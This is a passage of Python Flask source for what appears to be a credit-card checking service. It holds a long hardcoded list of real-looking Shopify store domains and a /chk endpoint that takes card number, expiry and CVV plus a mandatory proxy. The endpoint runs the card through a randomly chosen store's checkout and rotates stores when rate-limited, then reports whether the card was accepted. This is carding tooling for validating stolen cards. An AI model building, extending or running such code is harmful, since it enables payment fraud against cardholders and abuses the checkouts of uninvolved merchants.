    "stickerdad-shirtmama.myshopify.com", "stickii-club.myshopify.com", "stokes-international.myshopify.com",
    "stone-products-unlimited.myshopify.com", "stonestreetcoffee.myshopify.com", "store.mtjoyband.com",
    "strand-industries.myshopify.com", "stream-designz.myshopify.com", "strictlystatic.myshopify.com",
    "strung-by-stroh.myshopify.com", "stuart-jones-store.myshopify.com", "student-made-at-college-of-the-ozarks.myshopify.com",
    "studio-abachar.myshopify.com", "studiobrootle.myshopify.com", "sugarees-bakery-store.myshopify.com",
    "suihejewelry.myshopify.com", "sunbelt-mfg-co.myshopify.com", "sunny-health-and-fitness.myshopify.com",
    "sunshinemall-k-beauty.myshopify.com", "suntailmermaid.myshopify.com", "super-butcher.myshopify.com",
    "super-promo-videos.myshopify.com", "superxbullauto.myshopify.com", "suzys-sitcom-store.myshopify.com",
    "svensisland.myshopify.com", "sweetflour-bakeshop.myshopify.com", "sydney-so-sweet.myshopify.com",
    "talley-twine.myshopify.com", "tammys-elegant-frames.myshopify.com", "tarquingroup.myshopify.com",
    "tcn-good-food-store.myshopify.com", "teamiblends-us.myshopify.com", "tech-accessories-club.myshopify.com",
    "technichemcorptrial.myshopify.com", "telegramme.myshopify.com", "temecula-coffee.myshopify.com",
    "terijocottrell.myshopify.com", "test-rhf.myshopify.com", "texas-national-outfitters.myshopify.com",
    "tgcworld.myshopify.com", "thac-store.myshopify.com", "the-blue-deal.myshopify.com",
    "the-dan-lok-store.myshopify.com", "the-dirt-label.myshopify.com", "the-extra-detail.myshopify.com",
    "the-fitzgerald-shop.myshopify.com", "the-freckled-foot-doc.myshopify.com", "the-good-meal-co.myshopify.com",
    "the-helm.myshopify.com", "the-homes-i-have-made.myshopify.com", "the-lifestyle-people.myshopify.com",
    "the-london-bee-company.myshopify.com", "the-main-street-exchange.myshopify.com", "the-nesting-house.myshopify.com",
    "the-noble-brand-candle-co.myshopify.com", "the-oxford-soap-company.myshopify.com", "the-parlor-company.myshopify.com",
    "the-paul-walker-foundation.myshopify.com", "the-pink-monkey-uk.myshopify.com", "the-real-nappy-cafe.myshopify.com",
    "the-rock-shack-australia.myshopify.com", "the-rock-store-healing-centre.myshopify.com", "the-rose-gypsy.myshopify.com",
    "the-ruffled-daisy.myshopify.com", "the-skin-boutique-3.myshopify.com", "the-swan-princess.myshopify.com",
    "the-vintage-home-studio.myshopify.com", "the-wedding-of-my-dreams-2.myshopify.com", "the-wiltshire-tea-company-3.myshopify.com",
    "theartofsoccer.shop", "theblacksmithstore.myshopify.com", "thecanvawizard.myshopify.com",
    "thecoffeemonsterzco.myshopify.com", "thefarmersdaughterfibers.com", "thefarmstandonrussellroad.myshopify.com",
    "thehouseofemily.myshopify.com", "thejewellerystorelondon1.myshopify.com", "thelittlerig.myshopify.com",
    "theorangebuffalo.myshopify.com", "thepainpod-com.myshopify.com", "thequickflickuk.myshopify.com",
    "therapy-fun-store.myshopify.com", "theshelfshop.com", "thestarfishface.com",
    "thesuspensionexperts.myshopify.com", "thomas-hobbs-florist.myshopify.com", "thornandburrow.myshopify.com",
    "three-little-boys.myshopify.com", "thrifttherunway.myshopify.com", "throwin-stones.myshopify.com",
    "thunderthundertea.com", "thursosurf.myshopify.com", "tilesinspired.myshopify.com",
    "timely-pet-supplies-usa.myshopify.com", "tiny-orchard-quilts.myshopify.com", "tinybox-jewelry.myshopify.com",
    "tish-snookys-manic-panic.myshopify.com", "totyskincare.myshopify.com", "towelwarmers.myshopify.com",
    "townpool.myshopify.com", "tpf-cosmetics.myshopify.com", "tracyeinnysg.myshopify.com",
    "trashytesting.myshopify.com", "travelin-lite.myshopify.com", "traversebayfarms.myshopify.com",
    "treebicycleco.myshopify.com", "trees-for-a-change.myshopify.com", "trendinghi.myshopify.com",
    "trendyful.myshopify.com", "tricer-usa.myshopify.com", "trinkets-and-treasures-shop.myshopify.com",
    "tritonoutfitters.myshopify.com", "tropicofc.myshopify.com", "troya-australia.myshopify.com",
    "troyleedesigns.myshopify.com", "trubrands.myshopify.com", "truck-gloves-2.myshopify.com",
    "true-grace-dev.myshopify.com", "trycloudy.com", "trycloudy.myshopify.com",
    "tuck-life.myshopify.com", "turmeric-australia.myshopify.com", "tuscanitapware.myshopify.com",
    "tutus-green-world.myshopify.com", "twelve-little-2.myshopify.com", "twinings-uk.myshopify.com",
    "twisted-foods-cookie-dough.myshopify.com", "two-tails-pet-company.myshopify.com", "ubco-bikes.myshopify.com",
    "ugreen-eu.myshopify.com", "ugreen-nas-uk.myshopify.com", "ukfiera.myshopify.com",
    "ullajohnson.myshopify.com", "ultrafire-official.myshopify.com", "ultrapress.myshopify.com",
    "umbrellaman.myshopify.com", "unboxme-dev.myshopify.com", "uncommon-james.myshopify.com",
    "upfitters-wholesale.myshopify.com", "upsuperiordesign.myshopify.com", "usa-skinfix.myshopify.com",
    "utkilts.myshopify.com", "utomic-design.myshopify.com", "utsumiamerica.com",
    "vacadillos.myshopify.com", "van-x-van.myshopify.com", "varioeveryday.myshopify.com",
    "vc-online-store-canada.myshopify.com", "vela-scarves.myshopify.com", "venum-official.myshopify.com",
    "vespertine-handmade.myshopify.com", "vesselbags.myshopify.com", "vilros-com.myshopify.com",
    "vintagepostage.myshopify.com", "vka5mx-7x.myshopify.com", "vrd-retail.myshopify.com",
    "vv6kxd-np.myshopify.com", "vytest.myshopify.com", "wagsandwine.myshopify.com",
    "waihana.myshopify.com", "wall-panels-australia.myshopify.com", "wallniture.myshopify.com",
    "wani0a-bd.myshopify.com", "wasecabiomes.myshopify.com", "waterdrop-official-eu.myshopify.com",
    "wax-industries.myshopify.com", "we-are-hairy-people.myshopify.com", "we-go-home.myshopify.com",
    "weareready-sg.myshopify.com", "welburngourds.myshopify.com", "well-groomed-shop.myshopify.com",
    "welock-official.myshopify.com", "wernercouk.myshopify.com", "west3d-printing.myshopify.com",
    "western-skies.myshopify.com", "westland-distillery.myshopify.com", "what-goes-around-abq.myshopify.com",
    "whisky-tasting-co.myshopify.com", "whitechapelgallery.myshopify.com", "whiteriver-mouldings.myshopify.com",
    "wholesale-origin.myshopify.com", "wholesome-hub.myshopify.com", "wild-herb-soap-co.myshopify.com",
    "wilton-london.myshopify.com", "wintersindustries.myshopify.com", "without-dev.myshopify.com",
    "wooden-spoons-alaska.myshopify.com", "woodencamera1.myshopify.com", "woofcrate-8754.myshopify.com",
    "word-of-mouth-floors-llc.myshopify.com", "work-piece.myshopify.com", "worklocker-launceston.myshopify.com",
    "workwear-express-online.myshopify.com", "wrinklesschhminkles-usa.myshopify.com", "www-childrenofdesign-com.myshopify.com",
    "www-iconic-style-com.myshopify.com", "www.4ocean.com", "www.artifactpuzzles.com",
    "www.bioliteenergy.com", "www.chavibes.com", "www.coleyhome.com",
    "www.elder-statesman.com", "www.foreveremdesigns.com", "www.johnnysgoods.com",
    "www.maltosefalcons.com", "www.materiol.com", "www.mistolino.com",
    "www.moirabeauty.com", "www.momoslimes.com", "www.pugliepug.com",
    "www.retrowaviest.com", "www.rutherfordtrophies.com", "www.storeyfamilyfarm.com",
    "www.topangascents.com", "wywatl.myshopify.com", "yeah-its-jewelry.myshopify.com",
    "yearpins.myshopify.com", "youtopian-sleep.myshopify.com", "zenintcg.myshopify.com",
    "zulu-zephyr.myshopify.com", "zzmall-store.myshopify.com",
]


@app.route("/chk", methods=["GET"])
@app.route("/", methods=["GET"])
def chk():
    cc_raw = request.args.get("cc", "").strip()
    site   = request.args.get("site", "").strip()
    proxy  = request.args.get("proxy", "").strip()

    if not cc_raw:
        return Response("Error: missing 'cc' parameter (format: num|mm|yy|cvv)", status=400, mimetype="text/plain")

    if not proxy:
        return Response("Error: missing 'proxy' parameter — proxy is required", status=400, mimetype="text/plain")

    # Pick a random site from the hardcoded pool if none supplied
    user_supplied_site = bool(site)
    if not site:
        site = "https://" + random.choice(SITES)
    elif not site.startswith("http"):
        site = "https://" + site

    try:
        parts = parse_cc_string(cc_raw)
        cc  = parts["cc"]
        mes = parts["mes"]
        ano = parts["ano"]
        cvv = parts["cvv"]
    except Exception as e:
        return Response(f"Error: invalid cc format — {e}\nExpected: num|mm|yy|cvv", status=400, mimetype="text/plain")

    t0 = time.time()
    success = False
    message = "ERROR"
    gateway = "Shopify Payments"
    total_price = "0"
    currency = "USD"

    # Auto-rotate to another site on 429 (rate-limited) — up to 3 attempts
    _MAX_SITE_RETRIES = 3
    _tried_sites = {site}
    for _site_attempt in range(_MAX_SITE_RETRIES):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                success, message, gateway, total_price, currency = loop.run_until_complete(
                    asyncio.wait_for(
                        process_card(cc, mes, ano, cvv, site, proxy_str=proxy or None),
                        timeout=55,
                    )
                )
            finally:
                loop.close()
        except asyncio.TimeoutError:
            message = "TIMEOUT"
            break
        except Exception as e:
            message = str(e) or type(e).__name__
            break

        # If rate-limited or all products too expensive, rotate to a fresh site
        if message in ("RATE_LIMITED_429", "PRICE_TOO_HIGH") and not user_supplied_site:
            candidates = [s for s in SITES if "https://" + s not in _tried_sites]
            if candidates:
                site = "https://" + random.choice(candidates)
                _tried_sites.add(site)
                continue  # retry with new site
        break  # success or non-retryable error

    elapsed = round(time.time() - t0, 2)
    clean_msg = extract_clean_response(message)
    amount_str = (
        f"{total_price} {currency.upper()}"
        if total_price and str(total_price) not in ("0", "0.0", "0.00")
        else total_price or "0"
    )
    gateway_str = gateway if gateway and gateway not in ("", "UNKNOWN") else "Shopify Payments"

    body = (
        f"Cc: {cc_raw}\n"
        f"Response: {clean_msg}\n"
        f"Gateway: {gateway_str}\n"
        f"Amount: {amount_str}\n"
        f"Site: {site}\n"
        f"Proxy: {proxy or 'None'}\n"
        f"Time: {elapsed}s"
    )
    return Response(body, status=200, mimetype="text/plain")
